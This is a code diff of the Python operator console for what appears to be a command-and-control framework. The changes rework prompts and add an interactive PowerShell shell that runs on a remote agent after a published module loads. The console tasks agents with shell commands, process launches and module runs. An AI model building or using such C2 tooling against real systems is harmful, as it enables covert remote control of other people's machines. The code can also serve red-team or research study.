@@ -119,7 +119,7 @@ class MainMenu(cmd.Cmd):
 			print helpers.color("[!] Please specify a valid stage name. You can use 'listPublishedStage' to see them")
 			return
 
-		r = raw_input(" > Delete published stage [{}]? [Y/n] ".format(stageName))
+		r = raw_input(helpers.color("[?] Delete published stage [{}]? [Y/n] ".format(stageName)))
 		if r.lower() in ['','y']:
 			self.mainHandler.deletePublishedStage(stageName)
 
@@ -129,7 +129,7 @@ class MainMenu(cmd.Cmd):
 
 	#------------------------------------------------------------------------------------
 	def do_publishModule(self, args):
-		"""publishModule <module file>\nPublish a module the C2 server so it can later be used by an agent"""
+		"""publishModule <module file>\nPublish a PowerShell module the C2 server so it can later be used by an agent"""
 
 		# Checking args
 		if not args:
@@ -150,7 +150,7 @@ class MainMenu(cmd.Cmd):
 	#------------------------------------------------------------------------------------
 	def complete_publishModule(self, text, line, startidx, endidx):
 		modulePath = cfg.defaultPath['modules']
-		return [f for f in os.listdir(modulePath) if os.path.isfile(os.path.join(modulePath,f)) and f.startswith(text)]
+		return [f for f in os.listdir(modulePath) if os.path.isfile(os.path.join(modulePath,f)) and f.startswith(text) and f.endswith(".ps1")]
 
 	#------------------------------------------------------------------------------------	
 	def do_deletePublishedModule(self, args):
@@ -167,7 +167,7 @@ class MainMenu(cmd.Cmd):
 			print helpers.color("[!] Please specify a valid module name. You can use 'listPublishedModule' to see them")
 			return
 
-		r = raw_input(" > Delete published module [{}]? [Y/n] ".format(moduleName))
+		r = raw_input(helpers.color("[?] Delete published module [{}]? [Y/n] ".format(moduleName)))
 		if r.lower() in ['','y']:
 			self.mainHandler.deletePublishedModule(moduleName)
 
@@ -244,8 +244,7 @@ class MainMenu(cmd.Cmd):
 		
 	#------------------------------------------------------------------------------------
 	def do_taskList(self, args):
-		"""Show the list of all pending tasks assigned to any agent"""
-		
+		"""Show the list of all pending tasks assigned to any agent"""		
 		helpers.printPendingTaskList(self.statusHandler.pendingTaskList)
 			
 	#------------------------------------------------------------------------------------
@@ -328,7 +327,7 @@ class AgentMenu(cmd.Cmd):
 			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
 			return
 
-		userCmd = raw_input("CMD> ")
+		userCmd = raw_input("Command: ")
 		if userCmd:
 			self.agentHandler.taskAgentWithCLI(userCmd)
 
@@ -347,7 +346,7 @@ class AgentMenu(cmd.Cmd):
 
 		userCmd = ""
 		while userCmd != "exit":	
-			userCmd = raw_input("Shell> ")
+			userCmd = raw_input("PS> ")
 			if userCmd:
 				if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
 					print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
@@ -384,8 +383,8 @@ class AgentMenu(cmd.Cmd):
 		self.agentHandler.taskAgentWithLaunchProcess(exePath, parameters)
 
 	#------------------------------------------------------------------------------------
-	def do_runModule(self, args):
-		"""runModule <module name> [arguments]\nInstruct the agent to run a *published* module with optionnal arguments"""
+	def do_runPSModule(self, args):
+		"""runPSModule <module name> [arguments]\nLoads a *published* PowerShell module with optionnal arguments, and optionnaly get a CLI to interact with it"""
 		
 		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
 			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
@@ -393,24 +392,37 @@ class AgentMenu(cmd.Cmd):
 			
 		# Checking args
 		if not args:
-			print helpers.color("[!] Missing arguments. Command format: runModule <module name> [arguments]")
+			print helpers.color("[!] Missing arguments. Command format: runPSModule <module name> [arguments]")
 			return
 			
 		# Retrieve arguments		
 		arguments = args.split(' ',1)
-
 		moduleName = arguments[0]
-		moduleArgs = arguments[1] if len(arguments) > 1 else " "
+		moduleArgs = arguments[1] if len(arguments) > 1 else None
 		
 		# Check if the module is valid and published
 		if not self.statusHandler.isValidModule(moduleName):
 			print helpers.color("[!] Please specify a valid module. You can use 'listPublishedModule' to see them")
 			return
 		
-		self.agentHandler.taskAgentWithRunModule(moduleName, moduleArgs)
+		# Ask the user if he wants an interactive shell with the module loaded
+		r = raw_input(helpers.color("[?] Once module loaded, do you want to get a powershell CLI to interact it (y/N)?"))
+		if r.lower() == "y":
+			self.agentHandler.taskAgentWithRunPSModule(moduleName, moduleArgs, True)
+			print helpers.color("[*] Please wait while the module is being loaded and a shell returned...")
+			userCmd = ""
+			while userCmd != "exit":	
+				userCmd = raw_input("PS> ")
+				if userCmd:
+					if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
+						print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
+					else:
+						self.agentHandler.taskAgentWithShell(userCmd)
+		else:
+			self.agentHandler.taskAgentWithRunPSModule(moduleName, moduleArgs)
 
 	#------------------------------------------------------------------------------------
-	def complete_runModule(self, text, line, startidx, endidx):
+	def complete_runPSModule(self, text, line, startidx, endidx):
 		return [moduleName for moduleName in self.statusHandler.publishedModuleList if moduleName.startswith(text)]
 		
 	#------------------------------------------------------------------------------------
